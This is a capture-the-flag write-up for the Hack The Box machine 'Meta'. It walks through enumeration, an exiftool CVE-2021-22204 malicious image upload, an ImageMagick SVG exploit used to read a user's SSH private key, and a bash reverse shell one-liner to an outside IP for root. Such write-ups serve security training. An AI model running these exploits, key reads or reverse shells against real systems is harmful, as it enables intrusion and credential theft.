# HTB META

## Initial Scans:
nmap -sV -sC

![image](https://user-images.githubusercontent.com/19478700/171474499-8e5e8458-fea4-4d04-bfae-b43e19555e81.png)


## Directory Enumeration
No directories found using:
gobuster dir --url artcorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25  > gobuster_dir.txt

## Sub-Domain Enum
#### Used dns proxy
https://github.com/hubdotcom/marlon-tools/blob/master/tools/dnsproxy/dnsproxy.py
#### Found dev01 subdmain using:
gobuster dns -t 30 -w /usr/share/wordlists/subdomains-top1million-110000.txt -d artcorp.htb

![image](https://user-images.githubusercontent.com/19478700/171474657-f3b2b867-f1c6-4050-b99c-144ec9675b7c.png)

## Exploit time
#### looks like service may be running exiftool to get the metadata
#### Server is Devian + php
#### May contain CVE-2021-22204-exiftool
#### Used this tool to create malicious jpg
https://github.com/convisolabs/CVE-2021-22204-exiftool
#### now we have access to the machine as www-data user
![image](https://user-images.githubusercontent.com/19478700/171474715-069534b9-3577-496c-aa75-062972d334cc.png)

## Privilege Escalation
#### we need to be thomas user in order to read user flag
#### lets scan the system process to check for any vulnerable services
https://github.com/DominicBreuker/pspy
#### using pspy (unprivileged Linux process snooping)
#### upload  to uploads folder and execute
![image](https://user-images.githubusercontent.com/19478700/171478219-ea840b58-ea21-4ab9-bfb5-a89ec8d4de1b.png)
![image](https://user-images.githubusercontent.com/19478700/171478770-2808a3a0-2690-4c2f-a9b5-f9bf9c5d4595.png)

#### some of these proceses may be vulnerable
![image](https://user-images.githubusercontent.com/19478700/171478902-6c623773-de08-4fb1-aa52-b598fff4605c.png)

#### lets check mogrify
$ mogrify --version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 
#### vulnerable version
https://www.exploit-db.com/exploits/39767

#### uploaded a malicious svg file wich exploits te vulneravility
![image](https://user-images.githubusercontent.com/19478700/171496540-0948b370-5fe6-4c60-b625-dc8b2d75d509.png)

![image](https://user-images.githubusercontent.com/19478700/171496381-3c6bb488-4ef8-47a4-b081-9ffc4400a727.png)

#### now lets get ssh keys using this vuln so that we can ssh as thomas
#### cat ~/.ssh/id_rsa

![image](https://user-images.githubusercontent.com/19478700/171498204-ff5b9e61-9c28-4368-80b5-c9820a94446d.png)


#### Lets use this key to login as thomas


![image](https://user-images.githubusercontent.com/19478700/171502006-5866b580-2eb3-4e1f-9dbf-56c4102af0a6.png)


## PE II
####now we get root user
#### 	
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

![image](https://user-images.githubusercontent.com/19478700/171504656-c1dfe54b-3c11-4b66-94ca-a133bc3252ea.png)
![image](https://user-images.githubusercontent.com/19478700/171504691-3e0a0ebf-5541-4e22-b3ea-e8e494eea81e.png)





